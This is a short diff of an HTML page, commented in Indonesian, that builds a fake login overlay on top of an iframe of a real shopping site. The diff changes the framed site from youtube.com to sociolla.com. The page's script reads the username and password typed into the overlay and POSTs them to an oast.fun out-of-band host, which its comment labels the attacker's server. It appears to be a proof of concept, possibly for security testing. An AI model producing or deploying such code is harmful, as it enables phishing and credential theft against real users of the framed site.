@@ -31,7 +31,7 @@
     <p>Ini adalah situs yang tampak normal...</p>
     
     <!-- Iframe yang menginjeksi domain target -->
-    <iframe id="maliciousFrame" src="https://youtube.com"></iframe>
+    <iframe id="maliciousFrame" src="https://sociolla.com"></iframe>
     
     <!-- Prompt palsu yang muncul di atas iframe -->
     <div class="overlay-prompt" id="fakePrompt">
@@ -49,7 +49,7 @@
             const password = document.getElementById('password').value;
             
             // Kirim kredensial ke server penyerang
-            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal', {
+            fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
                 method: 'POST',
                 body: JSON.stringify({username, password})
             });
